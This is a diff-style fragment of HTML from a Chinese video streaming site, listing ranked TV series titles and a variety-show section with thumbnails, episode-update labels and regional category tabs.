+                                                        <li><i>3</i><a href="/voddetail/63529.html" title="加油吧！程序员" target="_blank">加油吧！程序员</a><span>10-20</span></li>
+                                                        <li><i>4</i><a href="/voddetail/26975.html" title="黄昏的优作" target="_blank">黄昏的优作</a><span>10-19</span></li>
+                                                        <li><i>5</i><a href="/voddetail/10408.html" title="公寓大楼里的谋杀案第一季" target="_blank">公寓大楼里的谋杀案第</a><span>10-19</span></li>
+                                                        <li><i>6</i><a href="/voddetail/7828.html" title="我与沃尔特家男孩的生活" target="_blank">我与沃尔特家男孩的生</a><span>10-18</span></li>
+                                                        <li><i>7</i><a href="/voddetail/72227.html" title="口香糖第一季" target="_blank">口香糖第一季</a><span>10-20</span></li>
+                                                        <li><i>8</i><a href="/voddetail/8800.html" title="少年间谍第一季" target="_blank">少年间谍第一季</a><span>10-18</span></li>
+                                                        <li><i>9</i><a href="/voddetail/7702.html" title="外星居民第四季" target="_blank">外星居民第四季</a><span>10-18</span></li>
+                                                        <li><i>10</i><a href="/voddetail/92243.html" title="红妆问佳人" target="_blank">红妆问佳人</a><span>01-15</span></li>
+                                                        <li><i>11</i><a href="/voddetail/89962.html" title="昔有琉璃瓦" target="_blank">昔有琉璃瓦</a><span>12-28</span></li>
+                                                        <li><i>12</i><a href="/voddetail/56725.html" title="杨光的快乐生活之恋爱先生" target="_blank">杨光的快乐生活之恋爱</a><span>10-19</span></li>
+                                                        <li><i>13</i><a href="/voddetail/52519.html" title="民国侦探诡事录" target="_blank">民国侦探诡事录</a><span>10-19</span></li>
+                                                        <li><i>14</i><a href="/voddetail/15752.html" title="柔美的细胞小将第二季" target="_blank">柔美的细胞小将第二季</a><span>10-19</span></li>
+                                                        <li><i>15</i><a href="/voddetail/92555.html" title="重启2026" target="_blank">重启2026</a><span>03-31</span></li>
+                                                        <li><i>16</i><a href="/voddetail/79035.html" title="70年代秀  第四季" target="_blank">70年代秀  第四季</a><span>10-20</span></li>
+                                                        <li><i>17</i><a href="/voddetail/69031.html" title="步步惊心" target="_blank">步步惊心</a><span>10-20</span></li>
+                                                    </ul>
+                                                <ul class="undis">
+                                                        <li><i>1</i><a href="/voddetail/65233.html" title="许你万家灯火" target="_blank">许你万家灯火</a><span>11-27</span></li>
+                                                        <li><i>2</i><a href="/voddetail/21294.html" title="鬼同你OT国语" target="_blank">鬼同你OT国语</a><span>10-19</span></li>
+                                                        <li><i>3</i><a href="/voddetail/93182.html" title="蝇王" target="_blank">蝇王</a><span>02-10</span></li>
+                                                        <li><i>4</i><a href="/voddetail/73327.html" title="橘子郡男孩第一季" target="_blank">橘子郡男孩第一季</a><span>10-20</span></li>
+                                                        <li><i>5</i><a href="/voddetail/52586.html" title="姐妹情仇2017" target="_blank">姐妹情仇2017</a><span>10-19</span></li>
+                                                        <li><i>6</i><a href="/voddetail/19040.html" title="出头当自强国语" target="_blank">出头当自强国语</a><span>10-19</span></li>
+                                                        <li><i>7</i><a href="/voddetail/14018.html" title="篡位" target="_blank">篡位</a><span>10-19</span></li>
+                                                        <li><i>8</i><a href="/voddetail/10693.html" title="天地传说之鱼美人" target="_blank">天地传说之鱼美人</a><span>10-20</span></li>
+                                                        <li><i>9</i><a href="/voddetail/73007.html" title="拉字至上第一季" target="_blank">拉字至上第一季</a><span>10-20</span></li>
+                                                        <li><i>10</i><a href="/voddetail/12166.html" title="关于未知的我们" target="_blank">关于未知的我们</a><span>10-19</span></li>
+                                                        <li><i>11</i><a href="/voddetail/73583.html" title="金麦侦探社" target="_blank">金麦侦探社</a><span>10-20</span></li>
+                                                        <li><i>12</i><a href="/voddetail/13752.html" title="入住汉阳" target="_blank">入住汉阳</a><span>04-01</span></li>
+                                                        <li><i>13</i><a href="/voddetail/12608.html" title="老房子" target="_blank">老房子</a><span>10-19</span></li>
+                                                        <li><i>14</i><a href="/voddetail/7199.html" title="我亲爱的祖国" target="_blank">我亲爱的祖国</a><span>10-18</span></li>
+                                                        <li><i>15</i><a href="/voddetail/63697.html" title="韩国人的餐盘" target="_blank">韩国人的餐盘</a><span>10-20</span></li>
+                                                        <li><i>16</i><a href="/voddetail/23525.html" title="少年天子" target="_blank">少年天子</a><span>10-19</span></li>
+                                                        <li><i>17</i><a href="/voddetail/13214.html" title="美国好人家" target="_blank">美国好人家</a><span>10-19</span></li>
+                                                    </ul>
+                        <ul class="undis">
+                                                        <li><i>1</i><a href="/voddetail/90055.html" title="冰雪之名" target="_blank">冰雪之名</a><span>10-20</span></li>
+                                                        <li><i>2</i><a href="/voddetail/70780.html" title="黯夜守护者粤语" target="_blank">黯夜守护者粤语</a><span>10-20</span></li>
+                                                        <li><i>3</i><a href="/voddetail/65573.html" title="氪星第二季" target="_blank">氪星第二季</a><span>10-20</span></li>
+                                                        <li><i>4</i><a href="/voddetail/75031.html" title="诈欺担保人第三季" target="_blank">诈欺担保人第三季</a><span>10-20</span></li>
+                                                        <li><i>5</i><a href="/voddetail/31034.html" title="有吉弘行爆笑助攻" target="_blank">有吉弘行爆笑助攻</a><span>10-20</span></li>
+                                                        <li><i>6</i><a href="/voddetail/15210.html" title="恋上少爷太难了" target="_blank">恋上少爷太难了</a><span>10-19</span></li>
+                                                        <li><i>7</i><a href="/voddetail/15007.html" title="谁看见了孔雀在跳舞？" target="_blank">谁看见了孔雀在跳舞？</a><span>10-19</span></li>
+                                                        <li><i>8</i><a href="/voddetail/59590.html" title="不安感第四季" target="_blank">不安感第四季</a><span>10-19</span></li>
+                                                        <li><i>9</i><a href="/voddetail/27053.html" title="25时，赤坂见" target="_blank">25时，赤坂见</a><span>10-19</span></li>
+                                                        <li><i>10</i><a href="/voddetail/78731.html" title="名酿家族第一季" target="_blank">名酿家族第一季</a><span>10-20</span></li>
+                                                        <li><i>11</i><a href="/voddetail/87373.html" title="明月曾照江东寒" target="_blank">明月曾照江东寒</a><span>10-20</span></li>
+                                                        <li><i>12</i><a href="/voddetail/77294.html" title="万能管家 第三季" target="_blank">万能管家 第三季</a><span>10-20</span></li>
+                                                        <li><i>13</i><a href="/voddetail/70742.html" title="十三号仓库第四季" target="_blank">十三号仓库第四季</a><span>10-20</span></li>
+                                                        <li><i>14</i><a href="/voddetail/66398.html" title="新阴阳魔界第二季" target="_blank">新阴阳魔界第二季</a><span>10-20</span></li>
+                                                        <li><i>15</i><a href="/voddetail/81907.html" title="绯闻女孩  第五季" target="_blank">绯闻女孩  第五季</a><span>10-20</span></li>
+                                                        <li><i>16</i><a href="/voddetail/67898.html" title="最佳情侣" target="_blank">最佳情侣</a><span>10-20</span></li>
+                                                        <li><i>17</i><a href="/voddetail/38181.html" title="独臂刀客断臂刀国语" target="_blank">独臂刀客断臂刀国语</a><span>10-19</span></li>
+                                                    </ul>
+                        <ul class="undis">
+                                                        <li><i>1</i><a href="/voddetail/76546.html" title="刘海戏金蟾" target="_blank">刘海戏金蟾</a><span>10-20</span></li>
+                                                        <li><i>2</i><a href="/voddetail/16720.html" title="王国第二季" target="_blank">王国第二季</a><span>10-19</span></li>
+                                                        <li><i>3</i><a href="/voddetail/15548.html" title="球拍少年团" target="_blank">球拍少年团</a><span>10-19</span></li>
+                                                        <li><i>4</i><a href="/voddetail/13567.html" title="来自星星的你" target="_blank">来自星星的你</a><span>10-19</span></li>
+                                                        <li><i>5</i><a href="/voddetail/11521.html" title="赤橙黄绿青蓝紫" target="_blank">赤橙黄绿青蓝紫</a><span>10-19</span></li>
+                                                        <li><i>6</i><a href="/voddetail/8971.html" title="我的世界你好" target="_blank">我的世界你好</a><span>10-18</span></li>
+                                                        <li><i>7</i><a href="/voddetail/24814.html" title="桑尼" target="_blank">桑尼</a><span>10-19</span></li>
+                                                        <li><i>8</i><a href="/voddetail/94132.html" title="真爱龄距离" target="_blank">真爱龄距离</a><span>03-21</span></li>
+                                                        <li><i>9</i><a href="/voddetail/73503.html" title="越南战争" target="_blank">越南战争</a><span>10-20</span></li>
+                                                        <li><i>10</i><a href="/voddetail/62560.html" title="蓝色水玲珑" target="_blank">蓝色水玲珑</a><span>10-19</span></li>
+                                                        <li><i>11</i><a href="/voddetail/76403.html" title="神断狄仁杰" target="_blank">神断狄仁杰</a><span>10-20</span></li>
+                                                        <li><i>12</i><a href="/voddetail/37499.html" title="全职没女粤语" target="_blank">全职没女粤语</a><span>10-19</span></li>
+                                                        <li><i>13</i><a href="/voddetail/69159.html" title="灵异妙探第八季" target="_blank">灵异妙探第八季</a><span>10-20</span></li>
+                                                        <li><i>14</i><a href="/voddetail/11158.html" title="我叫张思德" target="_blank">我叫张思德</a><span>10-19</span></li>
+                                                        <li><i>15</i><a href="/voddetail/94850.html" title="寄往电视台的神秘影像" target="_blank">寄往电视台的神秘影像</a><span>05-08</span></li>
+                                                        <li><i>16</i><a href="/voddetail/38156.html" title="汇通天下粤语" target="_blank">汇通天下粤语</a><span>10-19</span></li>
+                                                        <li><i>17</i><a href="/voddetail/35680.html" title="蜀山奇侠国语" target="_blank">蜀山奇侠国语</a><span>10-19</span></li>
+                                                    </ul>
+                                            </div>
+                </div>
+                <!--/shot-->
+            </div>
+            <div class="cr"></div>
+        </div>
+                <div class="box">
+            <div class="content">
+                <div class="title">
+                    <h2><a href="/vodtype/3.html">综艺</a></h2>
+                    <dl>
+                        <dd><a href="javascript:void(0);">推荐</a></dd>
+                                                <dd><a href="/vodtype/20.html">内地综艺</a></dd>
+                                                <dd><a href="/vodtype/21.html">港台综艺</a></dd>
+                                                <dd><a href="/vodtype/22.html">日韩综艺</a></dd>
+                                                <dd><a href="/vodtype/23.html">欧美综艺</a></dd>
+                                            </dl>
+                </div>
+                <div class="bd clearfix">
+                    <ul class="img-list dis clearfix">
+                                                <li><a class="play-img" href="/voddetail/94279.html" title="Running Man" target="_blank"><img src="/upload/vod/20260323-1/c20deae7927ff24045b45171aaac1975.jpg" alt="Running Man" /><i></i><em>更新至20260628期</em></a><b><a href="/voddetail/94279.html" title="Running Man" target="_blank">Running Ma..</a></b>
+                            <p>2010-日韩综艺</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/94444.html" title="无限超越班第四季" target="_blank"><img src="/upload/vod/20260329-1/2c475b572171cc5db1a5b17ae6a49f8c.webp" alt="无限超越班第四季" /><i></i><em>已完结</em></a><b><a href="/voddetail/94444.html" title="无限超越班第四季" target="_blank">无限超越班第四季..</a></b>
+                            <p>2026-大陆综艺</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/94422.html" title="乘风2026" target="_blank"><img src="/upload/vod/20260328-1/98c83c80f29e1641840f2e30f17c75c7.webp" alt="乘风2026" /><i></i><em>更新至20260629期</em></a><b><a href="/voddetail/94422.html" title="乘风2026" target="_blank">乘风2026..</a></b>
+                            <p>2026-大陆综艺</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/95484.html" title="五十公里桃花坞6" target="_blank"><img src="/upload/vod/20260507-1/c6f50e31289b8996b33eb30610201957.webp" alt="五十公里桃花坞6" /><i></i><em>更新至20260629期</em></a><b><a href="/voddetail/95484.html" title="五十公里桃花坞6" target="_blank">五十公里桃花坞6..</a></b>
+                            <p>2026-大陆综艺</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96513.html" title="说唱巅峰对决2026" target="_blank"><img src="/upload/vod/20260627-1/19a797c4439dd0204494b125634d8a83.webp" alt="说唱巅峰对决2026" /><i></i><em>更新至20260629期</em></a><b><a href="/voddetail/96513.html" title="说唱巅峰对决2026" target="_blank">说唱巅峰对决2026..</a></b>
+                            <p>2026-大陆综艺</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/94685.html" title="大道独行之蝶龙变" target="_blank"><img src="/upload/vod/20260406-1/1d46b1965f57d2f3ab1021c6a374e228.jpg" alt="大道独行之蝶龙变" /><i></i><em>更新第14集</em></a><b><a href="/voddetail/94685.html" title="大道独行之蝶龙变" target="_blank">大道独行之蝶龙变..</a></b>
+                            <p>2026-港台综艺</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/94260.html" title="综艺大集合" target="_blank"><img src="/upload/vod/20260323-1/01c9c97569014df34a78b9d16d7a198c.jpg" alt="综艺大集合" /><i></i><em>更新至20260628期</em></a><b><a href="/voddetail/94260.html" title="综艺大集合" target="_blank">综艺大集合..</a></b>
+                            <p>2001-港台综艺</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96244.html" title="食神·百厨大战" target="_blank"><img src="/upload/vod/20260618-1/394ab48ce75afa49668de9e9954c59d8.webp" alt="食神·百厨大战" /><i></i><em>更新20260629</em></a><b><a href="/voddetail/96244.html" title="食神·百厨大战" target="_blank">食神·百厨大战..</a></b>
+                            <p>2026-大陆综艺</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/94348.html" title="豆腐妈妈" target="_blank"><img src="/upload/vod/20260326-1/f5fdef68af9059ecc77c54536eed907f.webp" alt="豆腐妈妈" /><i></i><em>更新至第134集</em></a><b><a href="/voddetail/94348.html" title="豆腐妈妈" target="_blank">豆腐妈妈..</a></b>
+                            <p>2025-台湾</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/3991.html" title="詹姆士出走料理" target="_blank"><img src="/upload/vod/20251018-4/c21d285c5ee570dec915c934fbb07151.jpg" alt="詹姆士出走料理" /><i></i><em>更新至20260628期</em></a><b><a href="/voddetail/3991.html" title="詹姆士出走料理" target="_blank">詹姆士出走料理..</a></b>
+                            <p>2022-港台综艺</p>
+                        </li>
+                                            </ul>
+                                        <ul class="img-list dis clearfix">
+                                                <li><a class="play-img" href="/voddetail/94444.html" title="无限超越班第四季" target="_blank"><img src="/upload/vod/20260329-1/2c475b572171cc5db1a5b17ae6a49f8c.webp" alt="无限超越班第四季" /><i></i><em>已完结</em></a><b><a href="/voddetail/94444.html" title="无限超越班第四季" target="_blank">无限超越班第四季..</a></b>
+                            <p>2026-大陆综艺</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/94422.html" title="乘风2026" target="_blank"><img src="/upload/vod/20260328-1/98c83c80f29e1641840f2e30f17c75c7.webp" alt="乘风2026" /><i></i><em>更新至20260629期</em></a><b><a href="/voddetail/94422.html" title="乘风2026" target="_blank">乘风2026..</a></b>
+                            <p>2026-大陆综艺</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/95484.html" title="五十公里桃花坞6" target="_blank"><img src="/upload/vod/20260507-1/c6f50e31289b8996b33eb30610201957.webp" alt="五十公里桃花坞6" /><i></i><em>更新至20260629期</em></a><b><a href="/voddetail/95484.html" title="五十公里桃花坞6" target="_blank">五十公里桃花坞6..</a></b>
+                            <p>2026-大陆综艺</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96513.html" title="说唱巅峰对决2026" target="_blank"><img src="/upload/vod/20260627-1/19a797c4439dd0204494b125634d8a83.webp" alt="说唱巅峰对决2026" /><i></i><em>更新至20260629期</em></a><b><a href="/voddetail/96513.html" title="说唱巅峰对决2026" target="_blank">说唱巅峰对决2026..</a></b>
+                            <p>2026-大陆综艺</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96244.html" title="食神·百厨大战" target="_blank"><img src="/upload/vod/20260618-1/394ab48ce75afa49668de9e9954c59d8.webp" alt="食神·百厨大战" /><i></i><em>更新20260629</em></a><b><a href="/voddetail/96244.html" title="食神·百厨大战" target="_blank">食神·百厨大战..</a></b>
+                            <p>2026-大陆综艺</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/210.html" title="新老娘舅" target="_blank"><img src="/upload/vod/20251018-1/85b4a540150290a39fc07e5b9d80b3c9.jpg" alt="新老娘舅" /><i></i><em>更新20260629</em></a><b><a href="/voddetail/210.html" title="新老娘舅" target="_blank">新老娘舅..</a></b>
+                            <p>2012-大陆综艺</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/95579.html" title="国乐无双" target="_blank"><img src="/upload/vod/20260514-1/887a2015671aa1aa227a23e3d7968d5d.webp" alt="国乐无双" /><i></i><em>更新20260628</em></a><b><a href="/voddetail/95579.html" title="国乐无双" target="_blank">国乐无双..</a></b>
+                            <p>2026-大陆综艺</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96297.html" title="脱口秀和Ta的朋友们第三季" target="_blank"><img src="/upload/vod/20260620-1/bf254bc25b925b3854918d4fce477bf0.webp" alt="脱口秀和Ta的朋友们第三季" /><i></i><em>更新至20260629期</em></a><b><a href="/voddetail/96297.html" title="脱口秀和Ta的朋友们第三季" target="_blank">脱口秀和Ta的朋友们..</a></b>
+                            <p>2026-大陆综艺</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/94253.html" title="暖暖的味道" target="_blank"><img src="/upload/vod/20260323-1/344e2944f7f2f2e2a0722a544aba2274.jpg" alt="暖暖的味道" /><i></i><em>更新至20260629期</em></a><b><a href="/voddetail/94253.html" title="暖暖的味道" target="_blank">暖暖的味道..</a></b>
+                            <p>2025-</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/174.html" title="欢乐集结号" target="_blank"><img src="/upload/vod/20251018-1/36a6d6fae644373300df39068bf2a4e7.jpg" alt="欢乐集结号" /><i></i><em>更新20260629</em></a><b><a href="/voddetail/174.html" title="欢乐集结号" target="_blank">欢乐集结号..</a></b>
+                            <p>2009-大陆综艺</p>
+                        </li>
+                                            </ul>
+                                        <ul class="img-list dis clearfix">
+                                                <li><a class="play-img" href="/voddetail/94685.html" title="大道独行之蝶龙变" target="_blank"><img src="/upload/vod/20260406-1/1d46b1965f57d2f3ab1021c6a374e228.jpg" alt="大道独行之蝶龙变" /><i></i><em>更新第14集</em></a><b><a href="/voddetail/94685.html" title="大道独行之蝶龙变" target="_blank">大道独行之蝶龙变..</a></b>
+                            <p>2026-港台综艺</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/94260.html" title="综艺大集合" target="_blank"><img src="/upload/vod/20260323-1/01c9c97569014df34a78b9d16d7a198c.jpg" alt="综艺大集合" /><i></i><em>更新至20260628期</em></a><b><a href="/voddetail/94260.html" title="综艺大集合" target="_blank">综艺大集合..</a></b>
+                            <p>2001-港台综艺</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/3991.html" title="詹姆士出走料理" target="_blank"><img src="/upload/vod/20251018-4/c21d285c5ee570dec915c934fbb07151.jpg" alt="詹姆士出走料理" /><i></i><em>更新至20260628期</em></a><b><a href="/voddetail/3991.html" title="詹姆士出走料理" target="_blank">詹姆士出走料理..</a></b>
+                            <p>2022-港台综艺</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/94348.html" title="豆腐妈妈" target="_blank"><img src="/upload/vod/20260326-1/f5fdef68af9059ecc77c54536eed907f.webp" alt="豆腐妈妈" /><i></i><em>更新至第134集</em></a><b><a href="/voddetail/94348.html" title="豆腐妈妈" target="_blank">豆腐妈妈..</a></b>
+                            <p>2025-台湾</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/130.html" title="女人我最大" target="_blank"><img src="/upload/vod/20251018-1/65eb1fe92a632a255719b025166e2a0c.jpg" alt="女人我最大" /><i></i><em>更新至20260629期</em></a><b><a href="/voddetail/130.html" title="女人我最大" target="_blank">女人我最大..</a></b>
+                            <p>2011-港台综艺</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/3636.html" title="百变智多星" target="_blank"><img src="/upload/vod/20251018-4/22c5f09b6304f60af4a68b6cc4c7f0b3.jpeg" alt="百变智多星" /><i></i><em>更新至20260629期</em></a><b><a href="/voddetail/3636.html" title="百变智多星" target="_blank">百变智多星..</a></b>
+                            <p>2023-港台综艺</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/94294.html" title="饥饿游戏" target="_blank"><img src="/upload/vod/20260323-1/0b4659b26703d3fcffb706d06824851c.jpg" alt="饥饿游戏" /><i></i><em>更新至20260628期</em></a><b><a href="/voddetail/94294.html" title="饥饿游戏" target="_blank">饥饿游戏..</a></b>
+                            <p>2016-港台综艺</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/126.html" title="闹着玩" target="_blank"><img src="/upload/vod/20251018-1/f9359fd6ba20f2819afd07382fa29482.jpg" alt="闹着玩" /><i></i><em>更新至第20260629期</em></a><b><a href="/voddetail/126.html" title="闹着玩" target="_blank">闹着玩..</a></b>
+                            <p>2022-港台综艺</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/3649.html" title="型男大主厨" target="_blank"><img src="/upload/vod/20251018-4/6eb65c1ba73eb591b1766a27ca73fde2.jpg" alt="型男大主厨" /><i></i><em>更新至2026029期</em></a><b><a href="/voddetail/3649.html" title="型男大主厨" target="_blank">型男大主厨..</a></b>
+                            <p>2019-港台综艺</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/94263.html" title="超级红人榜" target="_blank"><img src="/upload/vod/20260323-1/91ceaa0a8bd997dec43e0969b990d752.jpg" alt="超级红人榜" /><i></i><em>更新20260628</em></a><b><a href="/voddetail/94263.html" title="超级红人榜" target="_blank">超级红人榜..</a></b>
+                            <p>2010-港台综艺</p>
+                        </li>
+                                            </ul>
+                                        <ul class="img-list dis clearfix">
+                                                <li><a class="play-img" href="/voddetail/94279.html" title="Running Man" target="_blank"><img src="/upload/vod/20260323-1/c20deae7927ff24045b45171aaac1975.jpg" alt="Running Man" /><i></i><em>更新至20260628期</em></a><b><a href="/voddetail/94279.html" title="Running Man" target="_blank">Running Ma..</a></b>
+                            <p>2010-日韩综艺</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/95594.html" title="导演竞技场" target="_blank"><img src="/upload/vod/20260516-1/36f88557496ea8f1dd502b5c04634d9a.png" alt="导演竞技场" /><i></i><em>更新260626</em></a><b><a href="/voddetail/95594.html" title="导演竞技场" target="_blank">导演竞技场..</a></b>
+                            <p>2026-日韩综艺</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/3497.html" title="出家门的大声" target="_blank"><img src="/upload/vod/20251018-4/a9a77b4e47bac7f2a853746ab13f69af.jpg" alt="出家门的大声" /><i></i><em>更新至20260626期</em></a><b><a href="/voddetail/3497.html" title="出家门的大声" target="_blank">出家门的大声..</a></b>
+                            <p>2024-日韩综艺</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/95352.html" title="虽然没准备什么菜第四季" target="_blank"><img src="/upload/vod/20260501-1/258ec85c5cc2356cfb6aebcfc43cbbcc.webp" alt="虽然没准备什么菜第四季" /><i></i><em>更新至07期</em></a><b><a href="/voddetail/95352.html" title="虽然没准备什么菜第四季" target="_blank">虽然没准备什么菜第四..</a></b>
+                            <p>2026-日韩综艺</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/55196.html" title="环环相扣的老故事" target="_blank"><img src="/upload/vod/20251019-45/3cb337203d7b4e6829782b12d54a78dd.jpg" alt="环环相扣的老故事" /><i></i><em>更新至20260625期</em></a><b><a href="/voddetail/55196.html" title="环环相扣的老故事" target="_blank">环环相扣的老故事..</a></b>
+                            <p>2021-日韩综艺</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96272.html" title="Stand BI Me" target="_blank"><img src="/upload/vod/20260619-1/4031555482a0ec71a738d8c9af73d3d1.webp" alt="Stand BI Me" /><i></i><em>更新至04期</em></a><b><a href="/voddetail/96272.html" title="Stand BI Me" target="_blank">Stand BI M..</a></b>
+                            <p>2026-日韩综艺</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/28692.html" title="帮我找房子吧" target="_blank"><img src="/upload/vod/20251019-19/9081ed3c825413179c833b12b352bea2.jpg" alt="帮我找房子吧" /><i></i><em>更新至20260625期</em></a><b><a href="/voddetail/28692.html" title="帮我找房子吧" target="_blank">帮我找房子吧..</a></b>
+                            <p>2019-日韩综艺</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/3673.html" title="踢球的她们" target="_blank"><img src="/upload/vod/20251018-4/32d7da52206fbbab579541d90353f402.jpg" alt="踢球的她们" /><i></i><em>更新至20260624期</em></a><b><a href="/voddetail/3673.html" title="踢球的她们" target="_blank">踢球的她们..</a></b>
+                            <p>2021-日韩综艺</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/20098.html" title="同床异梦2" target="_blank"><img src="/upload/vod/20251019-10/50dd2032018a94216e2498ecf73283f0.jpg" alt="同床异梦2" /><i></i><em>更新至20260623期</em></a><b><a href="/voddetail/20098.html" title="同床异梦2" target="_blank">同床异梦2..</a></b>
+                            <p>2017-日韩综艺</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96406.html" title="恋爱战争" target="_blank"><img src="/upload/vod/20260624-1/879a25429076dbb42e705f82fdbabf21.webp" alt="恋爱战争" /><i></i><em>更新至01期</em></a><b><a href="/voddetail/96406.html" title="恋爱战争" target="_blank">恋爱战争..</a></b>
+                            <p>2026-日韩综艺</p>
+                        </li>
+                                            </ul>
+                                        <ul class="img-list dis clearfix">
+                                                <li><a class="play-img" href="/voddetail/95698.html" title="杰森·莫玛漫游记第二季" target="_blank"><img src="/upload/vod/20260521-1/1f7d6b459488d5693ebe7894c45e454d.webp" alt="杰森·莫玛漫游记第二季" /><i></i><em>更新至06期</em></a><b><a href="/voddetail/95698.html" title="杰森·莫玛漫游记第二季" target="_blank">杰森·莫玛漫游记第二..</a></b>
+                            <p>2026-欧美综艺</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/95870.html" title="毕业贵族的绝密关系" target="_blank"><img src="/upload/vod/20260530-1/bc5e86f4f10fcaa90911a046ec858cc4.webp" alt="毕业贵族的绝密关系" /><i></i><em>已完结</em></a><b><a href="/voddetail/95870.html" title="毕业贵族的绝密关系" target="_blank">毕业贵族的绝密关系..</a></b>
+                            <p>2026-欧美综艺</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/14523.html" title="自闭也有爱(美版) 第三季" target="_blank"><img src="/" alt="自闭也有爱(美版) 第三季" /><i></i><em>已完结</em></a><b><a href="/voddetail/14523.html" title="自闭也有爱(美版) 第三季" target="_blank">自闭也有爱(美版) ..</a></b>
+                            <p>2025-欧美综艺</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/95701.html" title="璀璨迪拜：印度名流" target="_blank"><img src="/upload/vod/20260521-1/fa5477cbbb6dba3dcd22e6797bef9311.webp" alt="璀璨迪拜：印度名流" /><i></i><em>已完结</em></a><b><a href="/voddetail/95701.html" title="璀璨迪拜：印度名流" target="_blank">璀璨迪拜：印度名流..</a></b>
+                            <p>2026-欧美综艺</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/95700.html" title="杰森·莫玛漫游记第二季" target="_blank"><img src="/upload/vod/20260521-1/d6e1bb5d89d58ba0cb7c2c91f9710ceb.webp" alt="杰森·莫玛漫游记第二季" /><i></i><em>更新至02期</em></a><b><a href="/voddetail/95700.html" title="杰森·莫玛漫游记第二季" target="_blank">杰森·莫玛漫游记第二..</a></b>
+                            <p>2026-欧美综艺</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/94956.html" title="百万秘宝攻防战第二季" target="_blank"><img src="/upload/vod/20260415-1/15187f4bde3855164d4a4a13fde65646.webp" alt="百万秘宝攻防战第二季" /><i></i><em>已完结</em></a><b><a href="/voddetail/94956.html" title="百万秘宝攻防战第二季" target="_blank">百万秘宝攻防战第二季..</a></b>
+                            <p>2026-欧美综艺</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/93653.html" title="泰版跑男" target="_blank"><img src="/upload/vod/20260302-1/a9146b331a132a52a96cd783a526c45c.webp" alt="泰版跑男" /><i></i><em>已完结</em></a><b><a href="/voddetail/93653.html" title="泰版跑男" target="_blank">泰版跑男..</a></b>
+                            <p>2026-欧美综艺</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/95174.html" title="真心园艺秀" target="_blank"><img src="/upload/vod/20260422-1/b67fd8ccff86b8ec73869cde4b7ebd15.webp" alt="真心园艺秀" /><i></i><em>更新至06期</em></a><b><a href="/voddetail/95174.html" title="真心园艺秀" target="_blank">真心园艺秀..</a></b>
+                            <p>2026-欧美综艺</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/94957.html" title="百万秘宝攻防战第二季" target="_blank"><img src="/upload/vod/20260415-1/2999ea54be259f447f3f2c8b2a148c44.webp" alt="百万秘宝攻防战第二季" /><i></i><em>更新至03期</em></a><b><a href="/voddetail/94957.html" title="百万秘宝攻防战第二季" target="_blank">百万秘宝攻防战第二季..</a></b>
+                            <p>2026-欧美综艺</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/93977.html" title="爱情盲选：瑞典篇第三季" target="_blank"><img src="/upload/vod/20260315-1/641ab52b82817a6997efbd578ce42b21.png" alt="爱情盲选：瑞典篇第三季" /><i></i><em>更新第12集</em></a><b><a href="/voddetail/93977.html" title="爱情盲选：瑞典篇第三季" target="_blank">爱情盲选：瑞典篇第三..</a></b>
+                            <p>2026-欧美综艺</p>
+                        </li>
+                                            </ul>
+                                    </div>
+            </div>
+            <div class="side">
+                <div class="shot">
+                    <dl class="hitstab">
+                        <dt><a href="/label/top.html" target="_blank">最新综艺</a></dt>
+                        <dd><a>日</a></dd>
+                        <dd><a>周</a></dd>
+                        <dd class="sg"><a>月</a></dd>
+                        <dd><a>总</a></dd>
+                    </dl>
+                    <div class="bd">
+                        <ul class="dis">
+                                                        <li><i>1</i><a href="/voddetail/27573.html" title="六一特别节目《2024年亚洲跳绳锦标赛》" target="_blank">六一特别节目《202</a><span>10-19</span></li>
+                                                        <li><i>2</i><a href="/voddetail/73715.html" title="幸存者：正邪之争第二十季" target="_blank">幸存者：正邪之争第二</a><span>10-20</span></li>
+                                                        <li><i>3</i><a href="/voddetail/67048.html" title="目击超自然 第三季" target="_blank">目击超自然 第三季</a><span>10-20</span></li>
